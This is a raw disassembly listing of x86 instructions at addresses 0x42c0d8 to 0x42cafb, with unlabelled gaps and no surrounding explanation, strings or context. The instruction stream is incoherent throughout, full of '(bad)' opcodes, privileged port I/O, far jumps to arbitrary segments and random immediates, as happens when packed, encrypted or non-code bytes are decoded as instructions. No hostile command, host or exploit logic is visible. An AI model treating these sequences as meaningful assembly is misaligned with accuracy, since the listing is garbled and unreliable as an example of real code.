  42c0d8:	push   edi
  42c0d9:	jp     0x42c0af
  42c0db:	push   ebx
  42c0dc:	mov    esp,0xb9c62172
  42c0e1:	mov    edi,0xa55211b0
  42c0e6:	cld    
  42c0e7:	or     al,BYTE PTR [esi+edi*8+0x6a]
  42c0eb:	loope  0x42c108
  42c0ed:	add    ch,ch
  42c0ef:	data16 xor BYTE PTR [edi+0x10],ah
  42c0f3:	or     ah,al
  42c0f5:	es cld 
  42c0f7:	inc    esi
  42c0f8:	sbb    esp,DWORD PTR [esp+eax*1-0x10dec28c]
  42c0ff:	dec    ecx
  42c100:	jmp    0x42c129
  42c102:	outs   dx,BYTE PTR ds:[esi]
  42c103:	jmp    0x42c175
  42c105:	mov    al,ds:0xf760d5d6
  42c10a:	jae    0x42c0f9
  42c10c:	call   0x2e41f2dd
  42c111:	aad    0x3c
  42c113:	lods   al,BYTE PTR ds:[esi]
  42c114:	mov    ch,0x8f
  42c116:	lahf   
  42c117:	aas    
  42c118:	inc    esp
  42c119:	and    ah,BYTE PTR [ebp+0x57]
  42c11c:	mov    al,0xf3
  42c11e:	test   al,0x15
  42c120:	dec    ebp
  42c121:	jmp    FWORD PTR [ebp+0x310b0c58]
  42c127:	or     dh,BYTE PTR [ebx-0x1c6dfc6]
  42c12d:	add    al,dh
  42c12f:	add    bh,dl
  42c131:	lods   eax,DWORD PTR ds:[esi]
  42c132:	xor    BYTE PTR [ecx+0x8d],dl
	...
  42c194:	add    BYTE PTR [eax],al
  42c196:	imul   eax,DWORD PTR [edx-0x10105133],0x3fa4c76b
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	xor    al,0x22
  42c1a4:	aaa    
  42c1a5:	jnp    0x42c1a2
  42c1a7:	xlat   BYTE PTR ds:[ebx]
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    BYTE PTR [ebp+0x66],bh
  42c1b0:	xor    ecx,0xbe1b7fa3
  42c1b6:	pop    ebx
  42c1b7:	mov    bh,0xb3
  42c1b9:	fwait
  42c1ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1bb:	cld    
  42c1bc:	aas    
  42c1bd:	and    bl,cl
  42c1bf:	adc    DWORD PTR [esi],0x6244432f
  42c1c5:	add    eax,0x685fd943
  42c1ca:	clc    
  42c1cb:	push   esi
  42c1cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1cd:	out    dx,al
  42c1ce:	jnp    0x42c1e5
  42c1d0:	ds xchg edx,eax
  42c1d2:	(bad)  
  42c1d3:	push   0xd699e9b0
  42c1d8:	les    ebp,FWORD PTR [eax+0x10c53b28]
  42c1de:	adc    bh,0x14
  42c1e1:	mul    DWORD PTR [ebx]
  42c1e3:	jecxz  0x42c1db
  42c1e5:	push   ecx
  42c1e6:	psraw  mm0,QWORD PTR [eax]
  42c1e9:	mov    ds:0xc6792b70,al
  42c1ee:	div    BYTE PTR [edi]
  42c1f0:	repnz scas al,BYTE PTR es:[edi]
  42c1f2:	mov    ch,0x4d
  42c1f4:	ss jle 0x42c1b8
  42c1f7:	ss rdmsr 
  42c1fa:	add    dh,0xc3
  42c1fd:	pop    ss
  42c1fe:	pop    ebp
  42c1ff:	and    al,0x1
  42c201:	inc    esp
  42c202:	stc    
  42c203:	scas   al,BYTE PTR es:[edi]
  42c204:	enter  0x4bd3,0xa9
  42c208:	pop    ecx
  42c209:	push   ecx
  42c20a:	mov    edx,ebp
  42c20c:	js     0x42c1da
  42c20e:	mov    WORD PTR [esi],?
  42c210:	mov    dh,0x67
  42c212:	and    DWORD PTR [edi-0x766fec36],ebp
  42c218:	jnp    0x42c228
  42c21a:	jmp    0x78a9:0xbce152b1
  42c221:	jmp    0x5693db2e
  42c226:	lock xor DWORD PTR [edx],eax
  42c229:	repnz dec esi
  42c22b:	popa   
  42c22c:	ja     0x42c279
  42c22e:	(bad)  [esi+0x3ea34cb3]
  42c234:	in     al,0xa
  42c236:	rcl    BYTE PTR [ecx],cl
  42c238:	jns    0x42c1e3
  42c23a:	ret    
  42c23b:	xchg   ebx,eax
  42c23c:	(bad)  
  42c23d:	fwait
  42c23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c23f:	rol    BYTE PTR [esi+eax*2+0x1c],cl
  42c243:	jmp    0x24e65ca4
  42c248:	or     ebx,DWORD PTR [edi]
  42c24a:	sub    dh,BYTE PTR [ebx+0x36]
  42c24d:	aaa    
  42c24e:	cli    
  42c24f:	xchg   ebp,eax
  42c250:	sbb    al,0x1
  42c252:	xor    edx,edi
  42c254:	adc    edx,edi
  42c256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c257:	sub    edi,eax
  42c259:	popa   
  42c25a:	call   0x1ea0:0x9fd11d05
  42c261:	sub    ebx,DWORD PTR [edi+0x5acefc24]
  42c267:	ins    BYTE PTR es:[edi],dx
  42c268:	(bad)  
  42c269:	out    dx,al
  42c26a:	cs push ds
  42c26c:	fld    TBYTE PTR [eax]
  42c26e:	pop    eax
  42c26f:	dec    esi
  42c270:	push   ebp
  42c271:	mov    edx,cs
  42c273:	(bad)  
  42c274:	test   eax,0xf0bbbadd
  42c279:	rcr    dl,0x1
  42c27c:	mov    ebp,0x54625951
  42c281:	nop
  42c282:	sub    eax,0x73b32baf
  42c287:	out    dx,al
  42c288:	push   ss
  42c289:	jp     0x42c291
  42c28b:	jb     0x42c2b7
  42c28d:	dec    esp
  42c28e:	sbb    al,0x7c
  42c290:	stc    
  42c291:	xchg   edi,eax
  42c292:	xchg   ebx,eax
  42c293:	and    al,cl
  42c295:	cmp    eax,DWORD PTR [esi-0x1d]
  42c298:	fwait
  42c299:	sub    edi,eax
  42c29b:	fld    DWORD PTR [edi]
  42c29d:	adc    eax,DWORD PTR [ebp-0x70391daf]
  42c2a3:	and    eax,0x108757ad
  42c2a8:	pop    edi
  42c2a9:	call   0x70b6:0xb6bcc9a6
  42c2b0:	inc    esp
  42c2b1:	add    eax,0x80b559
	...
  42c316:	out    0xf,al
  42c318:	fldcw  WORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    edi,DWORD PTR [ecx-0x56]
  42c324:	ret    
  42c325:	xor    al,BYTE PTR [edx]
  42c327:	fld    DWORD PTR [ecx]
  42c329:	add    BYTE PTR [edi],al
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    BYTE PTR [edx],dh
  42c32f:	cdq    
  42c330:	sub    ecx,DWORD PTR [ebp+0x74]
  42c333:	jo     0x42c307
  42c335:	sub    eax,0x89f2f6fe
  42c33a:	xchg   ecx,eax
  42c33b:	jg     0x42c2da
  42c33d:	push   ss
  42c33e:	push   ds
  42c33f:	jge    0x42c2ea
  42c341:	cmp    DWORD PTR [esi+0x17],edx
  42c344:	fsub   DWORD PTR ds:0xd36b6d73
  42c34a:	cmp    esp,eax
  42c34c:	mov    edi,0x195cb523
  42c351:	mov    DWORD PTR [esi-0x5ce90189],edx
  42c357:	push   edx
  42c358:	pop    edi
  42c359:	push   ebp
  42c35a:	cli    
  42c35b:	iret   
  42c35c:	jmp    0x42c376
  42c35e:	enter  0x9b12,0xdb
  42c362:	bnd jno 0x42c3da
  42c365:	in     eax,0xb6
  42c367:	and    BYTE PTR [ecx],ah
  42c369:	fcmovnb st,st(5)
  42c36b:	(bad)  
  42c36c:	sbb    eax,0x398556cf
  42c371:	iret   
  42c372:	xor    DWORD PTR [edi+0x28096e17],esi
  42c378:	retf   
  42c379:	data16 and BYTE PTR [ebx+0x754e45e4],0x95
  42c381:	adc    DWORD PTR [eax-0x51de0d46],ebp
  42c387:	fidivr WORD PTR [edx]
  42c389:	or     eax,0x280ae8dc
  42c38e:	xor    ah,BYTE PTR [esi-0x20bfd27c]
  42c394:	out    0xfb,al
  42c396:	dec    ebx
  42c397:	mov    eax,0x150ade90
  42c39c:	out    0xc,eax
  42c39e:	enter  0xbb68,0x74
  42c3a2:	xor    eax,0xe7551b7
  42c3a7:	into   
  42c3a8:	push   ss
  42c3a9:	jb     0x42c3ec
  42c3ab:	mov    al,ds:0xc717625c
  42c3b0:	in     al,dx
  42c3b1:	inc    ecx
  42c3b2:	repnz shl BYTE PTR [edx-0x51d27033],0x4d
  42c3ba:	xchg   ebx,eax
  42c3bb:	mov    eax,esi
  42c3bd:	push   cs
  42c3be:	ret    
  42c3bf:	add    ch,BYTE PTR [edx-0x78bf41e3]
  42c3c5:	xor    ah,BYTE PTR [edx-0x4d]
  42c3c8:	out    dx,al
  42c3c9:	jmp    0x42c3d5
  42c3cb:	addr16 lock mov ch,0x32
  42c3cf:	inc    edi
  42c3d0:	test   eax,0x26747422
  42c3d5:	jne    0x42c3a3
  42c3d7:	add    BYTE PTR [esi-0x4ecbea84],0x44
  42c3de:	stos   DWORD PTR es:[edi],eax
  42c3df:	sahf   
  42c3e0:	pop    edi
  42c3e1:	dec    edi
  42c3e2:	push   es
  42c3e3:	pop    ecx
  42c3e4:	mov    cl,0x5b
  42c3e6:	jmp    0xd768:0xd731694a
  42c3ed:	es icebp 
  42c3ef:	xchg   ebp,eax
  42c3f0:	mov    ss,ebx
  42c3f2:	push   edi
  42c3f3:	dec    edi
  42c3f4:	add    BYTE PTR [esi-0x73fb7bf8],al
  42c3fa:	out    0x30,eax
  42c3fc:	adc    cl,BYTE PTR [ebx-0x69]
  42c3ff:	in     eax,dx
  42c400:	pop    DWORD PTR [ebp-0x64f4026c]
  42c406:	mov    WORD PTR [edx-0x11],es
  42c409:	shl    DWORD PTR [esi+0x3953c2cc],cl
  42c40f:	sbb    cl,BYTE PTR [ecx+0x0]
  42c412:	std    
  42c413:	mov    cl,BYTE PTR [ecx+0x28c6458f]
  42c419:	cmp    eax,0xdee2a2c3
  42c41e:	call   0x8771:0x8f1f5e95
  42c425:	xor    eax,0x1c28e862
  42c42a:	lahf   
  42c42b:	inc    edx
  42c42c:	in     al,dx
  42c42d:	or     al,BYTE PTR [ebx+ebx*8]
  42c430:	jl     0x42c47e
  42c432:	sub    al,0x47
  42c434:	mov    edx,0x0
	...
  42c495:	add    ah,ch
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    ch,dh
  42c4a3:	jecxz  0x42c48b
  42c4a5:	(bad)
  42c4a9:	add    BYTE PTR [edi],al
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    BYTE PTR [edx-0x54],cl
  42c4b0:	arpl   dx,bp
  42c4b2:	pop    ss
  42c4b3:	dec    edx
  42c4b4:	ds inc ebx
  42c4b6:	mov    ah,0x47
  42c4b8:	pop    ss
  42c4b9:	jg     0x42c4ad
  42c4bb:	repnz rcl bh,1
  42c4be:	retf   0x12d4
  42c4c1:	mov    esp,0x45cf333f
  42c4c6:	imul   edx,DWORD PTR [edx],0xffffff99
  42c4c9:	jne    0x42c50e
  42c4cb:	mov    WORD PTR [edi-0x3052da3b],ss
  42c4d1:	loopne 0x42c45f
  42c4d3:	iret   
  42c4d4:	adc    al,0x8b
  42c4d6:	jno    0x42c4f0
  42c4d8:	add    BYTE PTR [edx-0x1f],dl
  42c4db:	xor    edi,edx
  42c4dd:	or     DWORD PTR [edi+0x5d],esp
  42c4e0:	(bad)  
  42c4e1:	xor    eax,0x6ba04305
  42c4e6:	xchg   esp,eax
  42c4e7:	aam    0x3
  42c4e9:	mov    ebx,es
  42c4eb:	mov    ds:0x9a21aead,eax
  42c4f0:	pop    eax
  42c4f1:	or     DWORD PTR [ebp+edi*1+0x42193b43],ecx
  42c4f8:	inc    edi
  42c4f9:	in     eax,0x48
  42c4fb:	lahf   
  42c4fc:	pop    esp
  42c4fd:	das    
  42c4fe:	and    al,0xcf
  42c500:	mov    edi,0xed2994b4
  42c505:	mov    bl,0x7b
  42c507:	sbb    DWORD PTR [ecx],0x2b
  42c50a:	stc    
  42c50b:	jmp    0xfdd4:0x8904e7e8
  42c512:	cmp    al,BYTE PTR [edx-0x56]
  42c515:	xor    eax,DWORD PTR [eax-0x32f76aa]
  42c51b:	lods   al,BYTE PTR ds:[esi]
  42c51c:	pop    esp
  42c51d:	add    BYTE PTR [edi],ch
  42c51f:	push   edi
  42c520:	in     eax,0xa8
  42c522:	push   DWORD PTR [eax]
  42c524:	xchg   esp,eax
  42c525:	fadd   DWORD PTR [ebp+0x20cb4d10]
  42c52b:	shl    BYTE PTR [edi+eax*4-0x7211e81c],1
  42c532:	imul   ecx,edi,0xc7344510
  42c538:	aad    0xa1
  42c53a:	cdq    
  42c53b:	out    0xe8,eax
  42c53d:	leave  
  42c53e:	cmp    edi,ebx
  42c540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c541:	into   
  42c542:	outs   dx,BYTE PTR ds:[esi]
  42c543:	pop    eax
  42c544:	xor    BYTE PTR [edx],cl
  42c546:	adc    al,BYTE PTR ss:[ebx]
  42c549:	aaa    
  42c54a:	push   esp
  42c54b:	jmp    0x42c4fb
  42c54d:	pop    ebx
  42c54e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c54f:	mov    esi,0xc9c614ac
  42c554:	cmc    
  42c555:	adc    eax,0x4ab31e38
  42c55a:	outs   dx,BYTE PTR ds:[esi]
  42c55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c55c:	mov    esp,0x208546a5
  42c561:	pusha  
  42c562:	fst    st(7)
  42c564:	dec    bl
  42c566:	loope  0x42c5b4
  42c568:	sub    edi,esp
  42c56a:	jle    0x42c5e7
  42c56c:	shl    ch,cl
  42c56e:	jne    0x42c574
  42c570:	cmp    eax,0xd8532ba9
  42c575:	js     0x42c5d6
  42c577:	or     DWORD PTR [ecx],ebp
  42c579:	clc    
  42c57a:	popa   
  42c57b:	imul   esp,DWORD PTR [edx+ebp*8-0x65],0xff3c6b9
  42c583:	adc    ebx,ebx
  42c585:	adc    al,0x18
  42c587:	int    0xe7
  42c589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c58a:	sbb    BYTE PTR [eax],ch
  42c58c:	stos   BYTE PTR es:[edi],al
  42c58d:	mov    cl,0x98
  42c58f:	mov    ebx,0xbad6065a
  42c594:	ds pop ss
  42c596:	ins    DWORD PTR es:[edi],dx
  42c597:	add    al,BYTE PTR ds:0x73ac2bff
  42c59d:	das    
  42c59e:	and    al,0xdf
  42c5a0:	cmp    edx,DWORD PTR [eax-0x8e89565]
  42c5a6:	mov    ds:0x2654d1e7,al
  42c5ab:	dec    ebp
  42c5ac:	jmp    0x42c5d5
  42c5ae:	push   ds
  42c5af:	or     eax,0xcd14dc51
  42c5b4:	pop    ss
	...
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	and    al,0xb4
  42c624:	retf   
  42c625:	jno    0x42c637
  42c627:	fild   DWORD PTR [ecx]
  42c629:	add    BYTE PTR [edi],al
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    cl,cl
  42c62f:	xchg   edx,eax
  42c630:	jae    0x42c5ea
  42c632:	gs cwd 
  42c635:	repz ret 0x3b04
  42c639:	jmp    0x42c64e
  42c63b:	popf   
  42c63c:	xchg   BYTE PTR [ecx-0xeb70abb],bh
  42c642:	push   cs
  42c643:	mov    ds:0x5e59fefb,al
  42c648:	sbb    eax,0xca233a78
  42c64d:	neg    BYTE PTR [ebp+0x6a9de851]
  42c653:	sub    eax,esi
  42c655:	in     eax,0xec
  42c657:	fild   DWORD PTR ds:0x11bb24be
  42c65d:	popa   
  42c65e:	nop
  42c65f:	nop
  42c660:	mov    DWORD PTR [ecx-0x6efcdfaa],ecx
  42c666:	pop    ebp
  42c667:	mov    esi,0xfe707ea0
  42c66c:	jb     0x42c616
  42c66e:	retf   
  42c66f:	push   ds
  42c670:	(bad)  
  42c671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c672:	and    esp,DWORD PTR ss:[esi+0x6d77b7f6]
  42c679:	sub    al,0x97
  42c67b:	bound  eax,QWORD PTR [edx-0x2978c423]
  42c681:	cwde   
  42c682:	fcmovne st,st(6)
  42c684:	hlt    
  42c685:	jne    0x42c66d
  42c687:	adc    edx,DWORD PTR [edx-0x68]
  42c68a:	pop    eax
  42c68b:	cmp    esp,esi
  42c68d:	fidivr DWORD PTR [ebx-0x50]
  42c690:	mov    ebx,0x2bfe7cd2
  42c695:	mov    BYTE PTR [eax+0x39402c13],cl
  42c69b:	inc    ebp
  42c69c:	and    ebx,DWORD PTR [esi-0x6761d2c6]
  42c6a2:	or     eax,0x5d158254
  42c6a7:	fwait
  42c6a8:	rcr    BYTE PTR [esi+ebx*1+0x50],0x9e
  42c6ad:	inc    ecx
  42c6ae:	scas   eax,DWORD PTR es:[edi]
  42c6af:	jp     0x42c63c
  42c6b1:	stos   BYTE PTR es:[edi],al
  42c6b2:	and    BYTE PTR [edi+0x4d],cl
  42c6b5:	pop    esp
  42c6b6:	xchg   ebx,eax
  42c6b7:	add    edx,edx
  42c6b9:	jecxz  0x42c69d
  42c6bb:	out    dx,al
  42c6bc:	dec    ebx
  42c6bd:	jo     0x42c650
  42c6bf:	xor    BYTE PTR [eax+0x295613cd],0xaf
  42c6c6:	xchg   edx,eax
  42c6c7:	imul   edi,DWORD PTR [eax-0x32],0x1e
  42c6cb:	inc    edx
  42c6cc:	shl    BYTE PTR [edi+0x76],cl
  42c6cf:	js     0x42c66c
  42c6d1:	or     eax,0x78b7bf5a
  42c6d6:	push   ebp
  42c6d7:	hlt    
  42c6d8:	pop    es
  42c6d9:	rol    edx,1
  42c6db:	shr    DWORD PTR [ebx+0x71275e45],cl
  42c6e1:	mov    ds:0x3b147f5f,al
  42c6e6:	fucom  st(1)
  42c6e8:	test   eax,0xb02a0531
  42c6ed:	xchg   ebx,eax
  42c6ee:	add    ch,BYTE PTR [esi+edx*2+0x51]
  42c6f2:	enter  0xb009,0x69
  42c6f6:	mov    edi,0x2566a1a5
  42c6fb:	xlat   BYTE PTR ds:[ebx]
  42c6fc:	lds    esp,FWORD PTR [esi+0x28]
  42c6ff:	mov    bh,0x68
  42c701:	sub    eax,0x8edce0e
  42c706:	in     eax,0x68
  42c708:	xchg   BYTE PTR [ebp+0x6fea55ef],cl
  42c70e:	add    BYTE PTR [eax],dh
  42c710:	or     ebx,DWORD PTR [ebx]
  42c712:	mov    al,0xa7
  42c714:	out    dx,eax
  42c715:	lods   eax,DWORD PTR ds:[esi]
  42c716:	fdivr  QWORD PTR [ebp-0x56f05b99]
  42c71c:	mov    dl,0x90
  42c71e:	popa   
  42c71f:	inc    esp
  42c720:	inc    ebx
  42c721:	stc    
  42c722:	in     eax,dx
  42c723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c724:	scas   eax,DWORD PTR es:[edi]
  42c725:	lea    esp,[edx+edi*8-0x5c]
  42c729:	test   BYTE PTR [esi-0x1485ea9d],ch
  42c72f:	in     eax,dx
  42c730:	rcl    BYTE PTR [ecx],cl
  42c732:	dec    esi
  42c733:	repz les eax,FWORD PTR [eax]
	...
  42c796:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c79c:	jmp    FWORD PTR [ebp+0x3f90a016]
  42c7a2:	jg     0x42c7cb
  42c7a4:	lds    esp,FWORD PTR [edi+edx*1+0x70001dc]
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [edi-0x6f5b7180],bh
  42c7b3:	int    0x97
  42c7b5:	cmp    esi,DWORD PTR [ecx+0x5c]
  42c7b8:	cmp    DWORD PTR [ecx-0x45e13fd2],edi
  42c7be:	repnz pop esp
  42c7c0:	dec    edi
  42c7c1:	movzx  edx,cx
  42c7c4:	inc    esp
  42c7c5:	fld    DWORD PTR fs:[esi]
  42c7c8:	or     BYTE PTR ds:0x8bbe8892,0x4
  42c7cf:	add    al,0x55
  42c7d1:	dec    esi
  42c7d2:	mov    bh,0x6a
  42c7d4:	sub    eax,0x498b4f7c
  42c7d9:	scas   eax,DWORD PTR es:[edi]
  42c7da:	into   
  42c7db:	mov    ebp,0x10a679df
  42c7e0:	data16 ins BYTE PTR es:[edi],dx
  42c7e2:	push   0x8cb46914
  42c7e7:	call   0x725f1fdc
  42c7ec:	jne    0x42c7ed
  42c7ee:	daa    
  42c7ef:	loope  0x42c818
  42c7f1:	sub    eax,0x8c74e87
  42c7f6:	push   edx
  42c7f7:	ss dec ebp
  42c7f9:	dec    edx
  42c7fa:	test   al,0x5
  42c7fc:	outs   dx,DWORD PTR ds:[esi]
  42c7fd:	sbb    dl,BYTE PTR [esi+0x2e]
  42c800:	fcmovbe st,st(2)
  42c802:	dec    esp
  42c803:	sbb    BYTE PTR [eax-0x38eb3a1],bh
  42c809:	stc    
  42c80a:	mov    bl,BYTE PTR [ebx]
  42c80c:	xor    ecx,ebx
  42c80e:	mov    cl,dh
  42c810:	les    edi,FWORD PTR [edx-0x4b1d17bc]
  42c816:	or     dh,BYTE PTR [esp+eiz*2+0x77]
  42c81a:	dec    esi
  42c81b:	push   ebp
  42c81c:	aas    
  42c81d:	shl    BYTE PTR [eax+0x1ca64171],0x63
  42c824:	mov    ebp,0x14f7edd8
  42c829:	mov    esi,0xc55bc043
  42c82e:	int    0x30
  42c830:	imul   edi,DWORD PTR [edx],0x1f4c11b6
  42c836:	mov    esp,cs
  42c838:	ja     0x42c87b
  42c83a:	in     al,0x48
  42c83c:	iret   
  42c83d:	gs mov al,0x80
  42c840:	dec    edi
  42c841:	inc    esp
  42c842:	mov    dl,0xfe
  42c844:	inc    eax
  42c845:	jnp    0x42c7df
  42c847:	lea    edx,[edx]
  42c849:	jecxz  0x42c8a2
  42c84b:	add    BYTE PTR [eax],al
  42c84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c84e:	add    BYTE PTR [edi],al
  42c850:	iret   
  42c851:	adc    DWORD PTR [eax],esi
  42c853:	rcr    ch,1
  42c855:	lea    esi,[eax-0x4]
  42c858:	push   ss
  42c859:	addr16 jmp 0x670d:0xb058c2a2
  42c861:	mov    dl,0x4c
  42c863:	inc    ebp
  42c864:	outs   dx,BYTE PTR ds:[esi]
  42c865:	cmp    edx,DWORD PTR [edi-0x6fc0b912]
  42c86b:	cmp    ebp,edx
  42c86d:	sub    bl,dh
  42c86f:	sbb    ecx,ebx
  42c871:	sub    BYTE PTR [edx-0x22],ah
  42c874:	scas   eax,DWORD PTR es:[edi]
  42c875:	cld    
  42c876:	mov    ds:0x20ab5eb6,eax
  42c87b:	push   edi
  42c87c:	xor    bh,bl
  42c87e:	jl     0x42c860
  42c880:	clc    
  42c881:	jp     0x42c901
  42c883:	ret    
  42c884:	push   es
  42c885:	xchg   ebp,eax
  42c886:	loope  0x42c80a
  42c888:	mov    bl,0x5e
  42c88a:	cmp    dh,BYTE PTR [eax]
  42c88c:	mov    ds:0xbb875a58,al
  42c891:	sub    al,0xe8
  42c893:	repz or eax,0x3401f8d9
  42c899:	dec    esi
  42c89a:	or     ah,bh
  42c89c:	popf   
  42c89d:	push   ebx
  42c89e:	loopne 0x42c89e
  42c8a0:	pop    ds
  42c8a1:	mov    al,0xa2
  42c8a3:	fcmovb st,st(0)
  42c8a5:	xor    eax,0xe998b38
  42c8aa:	mov    ch,ch
  42c8ac:	daa    
  42c8ad:	mov    ds:0xf81a2ca5,al
  42c8b2:	push   ecx
  42c8b3:	adc    DWORD PTR [edx+0x0],ecx
	...
  42c916:	adc    BYTE PTR [ebx],bl
  42c918:	leave  
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	mov    ds:0x1e8f0692,al
  42c927:	fld    QWORD PTR [ecx]
  42c929:	add    BYTE PTR [edi],al
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR [edi-0x45],dl
  42c930:	jnp    0x42c96c
  42c932:	ror    BYTE PTR [esi+0x61],0xbf
  42c936:	push   es
  42c937:	adc    ah,cl
  42c939:	int    0xd3
  42c93b:	div    DWORD PTR [ebx-0x44]
  42c93e:	xchg   edx,eax
  42c93f:	stc    
  42c940:	pop    ecx
  42c941:	(bad)  
  42c942:	shr    BYTE PTR [esi-0x1b],0xa5
  42c946:	adc    BYTE PTR [ecx+0x2a],cl
  42c949:	push   0x6fddfa70
  42c94e:	xor    edi,ecx
  42c950:	stos   BYTE PTR es:[edi],al
  42c951:	and    ebp,DWORD PTR [edi]
  42c953:	sti    
  42c954:	and    eax,0x79e87d5f
  42c959:	aad    0x22
  42c95b:	cmp    al,0xae
  42c95d:	aad    0xea
  42c95f:	cmp    BYTE PTR [esi+esi*4-0x19],ch
  42c963:	je     0x42c940
  42c965:	ror    BYTE PTR [edi-0x7b87b878],cl
  42c96b:	cli    
  42c96c:	sbb    DWORD PTR [edi],esp
  42c96e:	cld    
  42c96f:	dec    eax
  42c970:	mov    al,ds:0x141f91d4
  42c975:	aaa    
  42c976:	shr    DWORD PTR ds:0xb66a1991,1
  42c97c:	cmp    al,0xd9
  42c97e:	popa   
  42c97f:	pop    ebp
  42c980:	push   edx
  42c981:	push   esp
  42c982:	fstp   DWORD PTR [ebx-0x3d1bd294]
  42c988:	sub    al,0xb3
  42c98a:	fcomi  st,st(5)
  42c98c:	mov    DWORD PTR [edi+0x2c782613],0x97fdd332
  42c996:	aas    
  42c997:	outs   dx,BYTE PTR ds:[esi]
  42c998:	stc    
  42c999:	stos   DWORD PTR es:[edi],eax
  42c99a:	cmp    al,0x95
  42c99c:	lock retf 
  42c99e:	push   ebp
  42c99f:	fst    DWORD PTR [edx+0xb6284dc]
  42c9a5:	out    0x67,eax
  42c9a7:	(bad)  
  42c9a8:	jp     0x42ca02
  42c9aa:	sub    BYTE PTR [edx+0xc],ch
  42c9ad:	mov    esi,0xb11760ed
  42c9b2:	xor    esi,DWORD PTR [eax]
  42c9b4:	sbb    al,0x1b
  42c9b6:	adc    DWORD PTR [edi+0x57],edx
  42c9b9:	call   0xdd8d:0xbd6f2955
  42c9c0:	mov    ebp,0xb6c69d9d
  42c9c5:	cwde   
  42c9c6:	sub    eax,0x3b1e190f
  42c9cb:	dec    ebp
  42c9cc:	scas   eax,DWORD PTR es:[edi]
  42c9cd:	sub    esi,DWORD PTR [ebp+0x1cebcdd1]
  42c9d3:	cvtps2pi mm7,QWORD PTR [edx-0x1d]
  42c9d7:	mov    ah,0x21
  42c9d9:	pop    ebp
  42c9da:	cdq    
  42c9db:	jo     0x42ca2a
  42c9dd:	call   0x1f844caa
  42c9e2:	iret   
  42c9e3:	jo     0x42c96c
  42c9e5:	sub    al,0x98
  42c9e7:	mov    ch,BYTE PTR [ebx-0x3f026521]
  42c9ed:	inc    edi
  42c9ee:	sub    al,dl
  42c9f0:	aam    0x1d
  42c9f2:	inc    edi
  42c9f3:	(bad)  
  42c9f4:	test   DWORD PTR [edi-0x38],0xe3e7f394
  42c9fb:	dec    ecx
  42c9fd:	mov    ah,0xb4
  42c9ff:	or     al,0x3c
  42ca01:	mov    ds:0xb19c858e,eax
  42ca06:	ret    
  42ca07:	daa    
  42ca08:	adc    al,0xfe
  42ca0a:	jne    0x42ca52
  42ca0c:	dec    esp
  42ca0d:	fs stos BYTE PTR es:[edi],al
  42ca0f:	cmp    BYTE PTR [edx+0x45],dh
  42ca12:	xchg   esi,eax
  42ca13:	pop    esi
  42ca14:	lds    esp,FWORD PTR [edx+0x47]
  42ca17:	add    eax,0x923a315c
  42ca1c:	in     eax,dx
  42ca1d:	sbb    bh,BYTE PTR [edi]
  42ca1f:	and    DWORD PTR [ecx+ebx*8-0x62],edx
  42ca23:	mov    cl,0x95
  42ca25:	push   edx
  42ca26:	add    DWORD PTR cs:[ecx],ecx
  42ca29:	sub    DWORD PTR [esi+0x2b4fee37],edx
  42ca2f:	test   eax,0x1ae7740c
  42ca34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0xb03a729b,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    BYTE PTR [edi-0x52],dh
  42cab0:	cwde   
  42cab1:	mov    bl,0x2f
  42cab3:	test   BYTE PTR [edx-0x2],dl
  42cab6:	fld    DWORD PTR [edx-0x5]
  42cab9:	call   0x7d43:0xf91eeef1
  42cac0:	jg     0x42ca7d
  42cac2:	or     BYTE PTR [edx],al
  42cac4:	in     al,0xe3
  42cac6:	sub    al,ah
  42cac8:	sub    edi,ebx
  42caca:	je     0x42ca4c
  42cacc:	mov    eax,ds:0x3a9d7b55
  42cad1:	rcl    DWORD PTR [edx+eiz*1+0x61c32811],cl
  42cad8:	hlt    
  42cad9:	mov    dl,BYTE PTR [ebx+0x73949dd5]
  42cadf:	fldln2 
  42cae1:	test   al,cl
  42cae3:	mov    esp,0xc8776c0a
  42cae8:	mov    bl,0xe0
  42caea:	pop    esi
  42caeb:	stc    
  42caec:	mul    DWORD PTR [ebx-0x11]
  42caef:	xor    dl,ch
  42caf1:	sub    edx,edx
  42caf3:	sub    BYTE PTR [ebx-0x27181247],0x65
  42cafa:	pop    esi
  42cafb:	jbe    0x42cb36
